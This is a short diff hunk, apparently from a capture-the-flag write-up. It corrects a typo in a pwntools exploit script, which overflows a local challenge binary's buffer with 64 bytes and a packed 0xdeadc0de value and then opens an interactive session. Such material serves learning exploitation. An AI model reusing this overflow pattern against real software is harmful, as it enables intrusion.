@@ -190,7 +190,7 @@ context.log_level = 'debug'
 
 r = process("./deadcode")
 r.recvuntil("app?")
-r.sendline(b'A' * 64 + p32(0xdeadcode))
+r.sendline(b'A' * 64 + p32(0xdeadc0de))
 r.interactive()
 ```
 
